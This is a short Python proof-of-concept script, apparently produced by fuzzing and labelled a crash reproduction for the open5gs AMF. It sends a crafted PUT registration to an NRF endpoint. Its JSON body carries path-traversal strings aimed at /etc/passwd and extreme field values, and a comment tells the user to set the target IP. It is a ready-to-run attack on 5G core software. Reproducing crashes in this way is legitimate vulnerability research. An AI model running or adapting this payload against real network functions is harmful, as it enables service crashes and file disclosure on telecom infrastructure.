#!/usr/bin/env python3
# Crash reproduction for open5gs-amf (info)
# Detected: Sat May  9 07:03:53 2026
import http.client, json

host, port = '127.0.0.1', 80  # Update to target IP
method = 'PUT'
path = '/nnrf-nfm/v1/nf-instances/NSSF-fuzz-8025'
body = b'{"nfInstanceId": "....//....//....//etc/passwd", "nfType": "", "nfStatus": "", "ipv4Addresses": ["172.23.0.20"], "fqdn": "....//....//....//etc/passwd", "priority": 256, "capacity": 256, "load": 4294967295, "nfServices": [{"serviceInstanceId": "namf-comm-001", "serviceName": "namf-comm", "versions": [{"apiVersionInUri": "v1", "apiFullVersion": "1.0.0"}], "scheme": "http", "nfServiceStatus": "REGISTERED", "ipEndPoints": [{"ipv4Address": "172.23.0.20", "port": 7777}]}]}'
conn = http.client.HTTPConnection(host, port, timeout=10)
headers = {'Content-Type': 'application/json'}
if body:
    conn.request(method, path, body=body, headers=headers)
else:
    conn.request(method, path, headers=headers)
resp = conn.getresponse()
print(f'Status: {resp.status}')
print(f'Body: {resp.read()[:500]}')
